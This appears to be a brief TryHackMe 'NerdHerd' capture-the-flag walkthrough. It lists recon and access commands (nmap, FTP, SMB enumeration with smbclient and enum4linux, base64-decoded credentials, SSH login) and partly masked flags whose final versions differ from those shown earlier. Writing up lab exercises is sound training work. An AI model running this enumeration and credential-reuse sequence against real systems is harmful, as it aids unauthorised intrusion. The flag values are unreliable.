...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ sudo nmap -A -sS -sC -sV -Pn -p- 10.10.48.80
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ ftp 10.10.132.29
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ cat hellon3rd.txt
all you need is in the leet
```

```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ exiftool youfoundme.png
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ smbclient -L \\10.10.48.80
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ smbclient \\\\10.10.48.80\\nerdherd_classified
Enter WORKGROUP\kali's password:
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ echo 'Y2liYXJ0b3dza2k=' | base64 -d
cibartowski
```

```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ echo 'aGVoZWdvdTwdasddHlvdQ==' | base64 -d
hehegou
```

```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ enum4linux 10.10.132.29
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ smbclient -U chuck \\\\10.10.132.29\\nerdherd_classified
...
```
bibo318@parrot:~/CTFs/tryhackme/NerdHerd$ ssh chuck@10.10.132.29
...
THM{V0N318*****7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
```
...
THM{V0N318*****5c5b7f0a81ac1c00732803adcee4a473cf1be693}
# cd /root
# cat .bash_history | grep -i -a thm
THM{V0N318*****a975c295ddeab5b1a5323df92f61c4cc9fc88207}
```

1. User Flag

`THM{V0N318*****7fc91d70e22e9b70f98aaf19f9a1c3ca710661be12**123:))}`

2. Root Flag

`THM{V0N318*****5c5b7f0a81ac1c00732803adcee4a473cf1be69312**123:))}`

3. Bonus Flag

`THM{V0N318*****a975c295ddeab5b1a5323df92f61c4cc9fc8820712**123:))}`
